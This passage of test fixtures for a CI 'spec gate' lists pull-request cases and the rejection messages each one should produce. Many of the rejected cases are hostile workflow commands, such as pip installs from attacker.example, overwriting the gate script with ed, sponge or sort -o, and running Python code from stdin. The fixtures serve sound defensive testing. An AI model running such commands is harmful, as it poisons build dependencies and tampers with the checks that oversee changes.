        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2df270e829287847a87dcefb991b070a73a9e111cfec2be6a6a25ec3f8c1b626', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `ed -s scripts/gate/spec_gate.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '4ef06eefd035328f101a21ff4909498ad13efdc66b2f778c0eb5ce703d0672c1', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `echo x | sponge scripts/gate/spec_gate.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '96bc9b353600aa4d5bb16d440c427996c967c8d75e9e062cf50d034d92162ba4', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: `sort -o scripts/gate/spec_gate.py lib/model.py` writes to or replaces a gate file; the workflows read the gate's files, never write them",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '0100f6fb300001225ebdacc71c11140659ebcd28b8750380c0e6ead632d3389b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '9828f7cc8bfa756bcf45bedf9e3eca74d934139155005d11a029768b2f7396c5', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip config set global.index-url https://attacker.example/simple` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '9e1aa4612e18556206af3b808f45942cf62f398e2cf9d565aebb5e71c8947cec', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install https://attacker.example/pyyaml-9.whl` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '09296acb1a55189a798175a00bcb0b413db951e5524ddea42114b5822ac7bce6', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install "pyyaml @ https://attacker.example/x.whl"` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '06d3883bb316e65601f2edbc1e779d2275f894547886a810377bb380bd0f9010', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install git+https://attacker.example/x.git` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'c64ae2665e0e352352c579e1e136ae8a7be1e60cd0d2d58ef36ffd5d5ad4a988', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install -r https://attacker.example/req.txt` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f1a51df07e7b64ccdb7a9e132d9dbe4f95166fac133c15dbd8989eb702e4769a', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install --index https://attacker.example/simple pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '82de11d614d09ca820e31074141efcae795f3fb156d950a72bd4b71003090e4c', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install ./` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '50c974c71710cdb1953fbef55813d0db778a3db739bd29b41d862cc6548d0115', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pip install lib/` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '83c74f3437e2707b64a90d241c24cf787947dd4b9c0cbd7edd083d4246b6371c', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pytest --junit-xml=scripts/gate/spec_gate.py lib` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a29236c96786b9541234629fe83f08265751339efe0dda28b40a1b0d7ed6c185', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pytest tests/scripts/test_spec_gate.py -q --log-file=scripts/gate/spec_gate.py` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2552cbf94eec5b6f6c1fe1560f1663f5d4fecbee19ec7c4af95a96bf094fd2c0', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pytest -o cache_dir=scripts/gate lib` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a24eee44ad3fd5189a646e37b4322a4bbdd453d0833f0e6be9bc55dd99f16df7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'a2814983e4d28fd634f8f9eeaee4434b99b81e1973802bcef8a63d62c591014b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the handoff artifact 'proposed-spec-gate' is uploaded or downloaded more than once, or with overwrite; the base's suite receives exactly the proposed gate",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'd175ba7475e68ec6bf03b3cab2b85a7d19848c56a6000a5993d149fdc8b898b4', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the handoff artifact 'proposed-spec-gate' is uploaded or downloaded more than once, or with overwrite; the base's suite receives exactly the proposed gate",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f8f5ebcbd717e0c666757d96a4c6e77bfa1f2116157d62a60c9fa91b01eef5f8', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`git diff --output=`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '6ca00c4f8e044f4906ec4293bea6712abe400619321b8627cb4d8d24315717b1', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`git log -1 --output`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '302d8b45f18b37bf66671b82c72df98994d8c6b25d8837f9699d9ba769fde9cc', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 /dev/stdin`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '64e4f5129493622ab1ece2439b8a27f10b36a155900736c00240353a61fd1572', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 -`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '2de007be1cc3dceaf79d7acf9cb092ce0ed805a49a8e1be0ecfefef72df0c20f', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: runs inline code (`python3 <`); the gate's workflows run scripts from the tree only, never eval, source or shopt, never extract archives, and run no module but pip, pytest and py_compile; xargs builds a command from its input; git only reads, never with --output; an interpreter never reads its program from stdin; pip installs named packages from the default index",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '36e5d371e7289f4581f308aa3ce6655633eaa57ea8ef4e640da5b219191e15b7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install .` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f9136700a1b99d4e53b904db5c9eaaf4ff3f28969c9c1eeddf8686b6d7405568', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install -e .` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'f0e29cf259113a33e09fb1961b202b99e0b0ccf92340257c55f72fb33548f967', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `python3 -m pip install --index-url https://attacker.example/simple pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '4e75d72a034ebc56da8f04448f8af4529518833d0f1f5ce5709e928a582b8c39', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: `pip install -f "$RUNNER_TEMP" pyyaml` runs pip or pytest beyond what the gate needs; pip installs named packages from the default index and pytest is the contract command with its permitted arguments',)),
        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '49feff4fa92fe17bfe5a2fbe0bc56eba2ac1fd106230dd1792d7320dea600e7b', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (' - docs/product/02-FEATURE-CATALOG.md: the FEAT-MODEL-001 Status is struck through; set it or remove it',)),
        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '1b74287c059bbe835f60d0594151f46ceb9c13544dab858ca72832072e37b0f5', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (' - docs/product/02-FEATURE-CATALOG.md: the FEAT-MODEL-001 record is unchanged from the base although it already reads {TODAY}; a second PR the same day still updates its record (its PRs, Status or notes)',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', '5213b2c7d023b57b4b23cf728859b212fe1f3a34021c4d158f2819010de9d76d', 0, ('$0',), 1, (" - PR body's Capacity section defers Volume (rule 0: no 'future work', 'TBD' or 'follow-up' on a workload's numbers); measure it or write 'n/a: <why>'",)),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/Product-Delivery/SKILL.md',), '51e42f39af313f2ea047d51b3ef11a3dd2f6b6cded8fcccf182df51287ca8b5d', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/Product-Delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/product-delivery-v2/SKILL.md',), 'a11a2ab3e2a2d4a4f2cc57221e1e6730dba9db6c36320a6acbafa7b64560d1d6', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/product-delivery-v2/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/other/SKILL.md',), '466dea624bb55131948702ac12d9c6ed3adb4ae4d716f2a15b5765059463aa9c', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/other/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/07-MODEL-REGISTRY.md', 'lib/model.py'), 'e88684dab2f6afe29d66a121d34dfa364f71224077bf84e04473592ceacd5238', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (' - docs/product/07-MODEL-REGISTRY.md: changes line(s) naming MODEL-GAMMA-001, MODEL-MAG-001, which docs/superpowers/specs/2026-09-01-model-decisions.md never names; a feature change edits only the registry rows of the models its spec covers',)),
    ),
    'test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contract': (
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '96f752d6607f644ef7eab211e81657d0727d1be79ad12578f1a959d63a7b62b4', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '65c8baa4a496a3caa65ca1407e47795d6a1e5389617b49949bfe7799f0f3421f', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '0a6cd1147282d76b43265fe519d0efeb5f73626c21d3aee1f23a7564c7806420', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md')),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '9947e3b351cbd018fbd333351b94c302c38f938812e6d1f66ac47b2085277a7b', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', '6edd1465439ffec654fc2994d435955be7007c61057746e0d580cb6aa938dde2', 0, ('$0',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/job.py', 'lib/model.py'), 'a77a698f346e519e510e7b942bc6df78aa28736846ce8bbf40e9e99ab02f6475', 'db154724afcb064d23c17db1b415a0dd87a150e8b68b8554690e584900582bb0', 0, ('$0',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/07-MODEL-REGISTRY.md', 'lib/model.py'), 'e7401e9717b4fd33a056a7045757b53ec109dc8f1d619405cacae93b3d0610db', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (" - docs/product/07-MODEL-REGISTRY.md: changes '| DOC-02 | Deferred |', a line naming none of docs/superpowers/specs/2026-09-01-model-decisions.md's models; a feature change edits only the registry rows of the models its spec covers",)),
        ((('PR_HEAD_REF', 'docs/drop-prs'),), ('docs/product/02-FEATURE-CATALOG.md',), '2aef999a28bf51ccb5634ef6f6d665cb694bbd105261625ea8bff442517d966f', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names",)),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'a7e1fca96d9c7d44a6d57d872d794f5fdbee5ca968f41e5b1ae08e4981b9709f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'd3ce183eeabf75bf3f709acc659fe82a7f3f4cc7725dad7b10f34f98ba3f408a', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), 'f90e0bb46d85b891f8de0a6ca83ff6ffb7609a72c390e7d20e0cee352fe7c85d', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/superpowers/vendored-x/SKILL.md',), '89b0a70a58834afdf4f3c5be1c91dba9583964ce2b047a732defa9b5027c664f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/superpowers/vendored-x/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '4fed2f8e8aa58d243f52ebf9f50ee19a9007c4da962decb61b0d972d47860b89', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - partially',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '258f5ec2aede95eba9c58f7580c4c0bed7a5451dab742cf3fe0a58f3edf68570', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - in progress',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '8df48b2450d845039912269aa3c4617821ab3e8054d0503bd5835c7e72cf4e55', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - WIP',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '691506752ad87e7b1be18dec19cb4e30073f06bd33e6ec2ba632dfafdb9ec5ce', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - not fully',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '32f3139d440fd328cf520d669bbd5181763b1222cd8d1e6fd832895ba2a7986f', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - remaining items tracked separately',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', 'fb70af04b3b0b1eb21bfb3ab108bbb5207956bab28aac33f2f19791c99ed9fa9', 0, (), 1, (' - a ticked done_when item defers its work, so it is not done: the registry test passes - later in a follow-up',)),
        ((('PR_HEAD_REF', 'feature/feat-new-001-x'), ('PR_TITLE', 'FEAT-NEW-001: x')), ('docs/superpowers/plans/2026-09-01-new.md', 'lib/model.py'), '90985baba0859d9f64393e520f1003e1e5a606aeef655e9a99f4ed5afe0b5d32', '2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881', 0, (), 1, (' - FEAT-NEW-001 is not a row in docs/product/02-FEATURE-CATALOG.md at the base branch; a capability is added before the work that uses it', ' - docs/superpowers/plans/2026-09-01-new.md: spec path does not exist: docs/superpowers/specs/2026-09-01-new.md')),
        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-model-later.md',), '82106fab823e8748e1c54da1d2be5575fec0498b5a0aaac2dbb156b70e6bbf10', None, 0, (), 1, (' - docs/superpowers/specs/2026-09-07-model-later.md: a new spec is draft or approved; superseded is what an approved spec becomes',)),
        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-FEAT-MODEL-001 Big Feature.md',), '604d45760388e8fbc1462c37329014efa36a4fdfd2593f67356e3aee1a9fb4ba', None, 0, (), 1, (' - docs/superpowers/specs/2026-09-07-FEAT-MODEL-001 Big Feature.md: a spec is named YYYY-MM-DD-<kebab-slug>.md',)),
        ((('PR_HEAD_REF', 'docs/new-spec'),), ('docs/superpowers/specs/2026-09-07-model-later.md',), '6ff96921fd925055d0d9a0d492f0b55b57655346568c5136d880a8ccf453c1d2', None, 0, (), 0, ()),
    ),
    'test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders_them': (
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '16632044fd5de028529fcf542cbcd98d1059dd3d200bb99805630bf0981fbb0b', 0, ('$0.01',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '107ca0eb30689a4fee6c63ff80e493f2de3bb9f5784e90ac7c204a9f6ff8ff83', 0, ('$0.01',), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'f44bfffaf39bafbf2fe659f5dd4fe6003787f4112a68322c35ac7dc663bad488', 0, ('$0.01',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '43d919684e64cbf94fa7ac2da96ebe741b5734fd8c1dcad7a36910697a636e5d', 0, ('$0.01',), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)', ' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md', " - PR body must carry each done_when item as its own '- [ ]' line starting with its text; missing: every model states its decision; the registry test passes")),
    ),
    'test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts_and_rendered_status': (
        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '5d6f378a1a18f8dd3397ab5506c13f1a7ab485d2544003ed79206b1a549dee11', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `test_a: an assertion that cannot fail`; the gate's suites carry no skip markers, collection hooks or exits",)),
        ((('PR_HEAD_REF', 'chore/gate-suite'),), ('tests/scripts/test_spec_gate.py',), '83033020108abca52376c58bf98d9fbfa6f62bff6310dd991384ff20fa27331f', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - tests/scripts/test_spec_gate.py: uses `test_a: decorated`; the gate's suites carry no skip markers, collection hooks or exits",)),
